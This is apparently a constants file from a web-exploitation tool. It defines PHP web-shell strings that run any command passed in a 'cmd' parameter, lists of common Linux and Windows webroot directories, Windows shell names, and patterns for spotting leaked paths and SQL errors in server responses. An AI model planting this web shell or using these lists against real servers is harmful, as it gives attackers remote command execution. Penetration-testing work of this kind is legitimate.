import re

MAX_DISPLAY_RESULTS = 10

PHP_SHELL_CITATION = '<?php system(' + '$_GET["cmd"]' + '); ?>'
PHP_SHELL_PING = "<?php system(" + "$_GET['cmd']" + "); ?>"

WEBROOTS = {
    "WINDOWS": ["", "C:/xampp/htdocs", "C:/wamp/www", "C:/Inetpub/wwwroot"],
    "LINUX": ["", "/var/www", "/var/www/html", "/var/www/htdocs", "/usr/local/apache2/htdocs", "/usr/local/www/data", "/var/apache2/htdocs", "/var/www/nginx-default", "/srv/www/htdocs", "/usr/local/var/www", "/usr/share/nginx/html"]
}

WINDOWS_SHELLS = ["powershell.exe", "powershell", "cmd.exe", "cmd"]

INTERESTING_STRINGS = ["INTERESTING_INCLUDED_PAYLOAD", ".aspx", ".jsp", ".php", "SQL Syntax", "Syntax Error", "Incorrect syntax", "Failed", "Error", "Warning"]
INTERESTING_STRINGS += [wr for wr in (WEBROOTS["LINUX"] + WEBROOTS["WINDOWS"]) if wr]
INTERESTING_STRINGS += [
    re.compile(br'\/(?:bin|boot|dev|etc|home|lib|lib32|lib64|lost\+found|media|mnt|opt|proc|root|run|sbin|srv|sys|tmp|usr|var)\/(?:[^\/\0]{1,16}\/)*[^\/\0]{0,16}'), # Linux path
    re.compile(br'[A-Za-z]:(?:\\(?: |!|[#-\.]|[0-9]|;|=|[@-\[]|[\]-{]|}|~)+)*\\?'), # Windows path
    re.compile(br'[A-Za-z]\0:\0(?:\\\0(?:(?: |!|[#-\.]|[0-9]|;|=|[@-\[]|[\]-{]|}|~)\0)+)*(?:\\\0)?'), # Windows path (UTF-16LE)
    re.compile(br'(?: |!|[#-\.]|[0-9]|;|=|[@-\[]|[\]-{]|}|~)+\.[Ll][Nn][Kk]'), # LNK file
    re.compile(br'((?: |!|[#-\.]|[0-9]|;|=|[@-\[]|[\]-{]|}|~)\0)+\.\0[Ll]\0[Nn]\0[Kk]\0'), # LNK file (UTF-16LE)
]